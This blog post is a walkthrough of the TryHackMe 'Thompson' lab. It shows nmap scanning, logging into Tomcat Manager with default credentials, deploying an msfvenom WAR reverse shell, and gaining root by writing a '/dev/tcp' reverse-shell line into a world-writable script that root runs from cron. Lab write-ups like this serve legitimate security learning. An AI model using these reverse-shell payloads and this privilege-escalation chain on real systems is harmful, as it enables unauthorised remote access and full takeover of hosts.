---
layout: post
title: Thompson
subtitle: TryHackME - Thompson
description: Enumerate services, scan  ports,upload shell, and escalate privileges to capture flags.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/f5e35bf1d933a9b45077e5388635a593.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/f5e35bf1d933a9b45077e5388635a593.png
tags:
  - TryHackME
  - Privilege Escalation
  - Find Flags
  -Cron Job
author: Mustafa Altayeb
date: 2025-10-14 00:00
paginate: true
---

# Thompson
[Thompson](https://tryhackme.com/room/bsidesgtthompson)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/f5e35bf1d933a9b45077e5388635a593.png)

## Objectives
1. Scan with Nmap
2. Enumerate Web to find interesting info 
3. Find input accept files 
4. Gain access with a reverse shell
5. Privilege escalation with Cron Job
6. Capture 2 flag

## Reconnaissance

### Nmap Scan
Port scan:
```bash
nmap -p- -T4 -sCV -oA Nmap_Thompson 10.10.34.161
```

**Key Findings**:
- **Port 22**:   OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 .
- **Port 8009**: ajp13   Apache Jserv (Protocol v1.3)
- **Port 8080**: Apache Tomcat 8.5.5

## Web Enumeration

**Port 8009**: no actions .
**Port 8080**: Running tomcat :

![](/assets/TryHackMeRoomsImage/Thompson/image.png)

- After clicking on `Manager App` it's alerted me to sigin in with login username and password :

![](/assets/TryHackMeRoomsImage/Thompson/image1.png)

- By trying incorrect login credential it's redirect me to page 401 `Unauthorized access`
and find login credential on this response :


[](/assets/TryHackMeRoomsImage/Thompson/image2.png)

Login credential is `user name : tomcat && password is s3cret ` 

- Login with this credential and get web page ` Tomcat Web Application Manager` :

![](/assets/TryHackMeRoomsImage/Thompson/image3.png)

- Enum this page and I find `Input` that accept files with extension `.war` 

![](/assets/TryHackMeRoomsImage/Thompson/image4.png) 

- Create `Reverse Shell` using msfvenom :

- By search about `.war` extension i find it's running Java web server :
![](/assets/TryHackMeRoomsImage/Thompson/image5.png) 

>|**msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.109.66 LPORT=9999 -f war > shell.war**



## Gain Initial Access 

- Upload Our Shell to site and Deploy 
- Start Listen with Netcat :
>|**nc -nlvp 9999**
- Access the shell by click on it .

```js
💻  T4T4R1S  🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
👀  ➜ ~/filetodelete/thm_machines/Thompson  nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.14.109.66] from (UNKNOWN) [10.10.34.161] 32838
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
- Now we gain access but limited shell
- Upgrade The Shell Using Python :
>|**python -c 'import pty; pty.spawn("/bin/bash")'**

```js
python -c 'import pty; pty.spawn("/bin/bash")'
tomcat@ubuntu:/$ 
```
### First flag 

```js
tomcat@ubuntu:/home/jack$ cat user.txt
cat user.txt
39400c90bc683a41a.............
```

## Privilege Escalation
- I searched for binary bits but not work 
- After some time i search for cron job:

```js
tomcat@ubuntu:/home/jack$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh
#
```
- File Called id.sh we have Privilege to write on it and it's execute with root privilege 

```js
tomcat@ubuntu:/home/jack$ ls -lah
ls -lah
total 48K
drwxr-xr-x 4 jack jack 4.0K Aug 23  2019 .
drwxr-xr-x 3 root root 4.0K Aug 14  2019 ..
-rw------- 1 root root 1.5K Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3.7K Aug 14  2019 .bashrc
drwx------ 2 jack jack 4.0K Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4.0K Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Oct 13 14:50 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
```

- let's write our shell to get root access:
```js
tomcat@ubuntu:/home/jack$ echo "bash -i >& /dev/tcp/10.14.109.66/8585 0>&1 " > id.sh
```

- Gain root access:
```js
💻  T4T4R1S  🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.14.109.66
👀  ➜ ~  nc -nlvp 8585
listening on [any] 8585 ...
connect to [10.14.109.66] from (UNKNOWN) [10.10.34.161] 34958
bash: cannot set terminal process group (1091): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# 
```

## Root Flag :
```js
root@ubuntu:~# cat root.txt
cat root.txt
d89d5391984c045................
```

Finished. Happy Hacking!



<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

Follow me:
- [LinkedIn](https://www.linkedin.com/in/t4t4r1s/)
- [X](https://x.com/T4T4R1S)

---

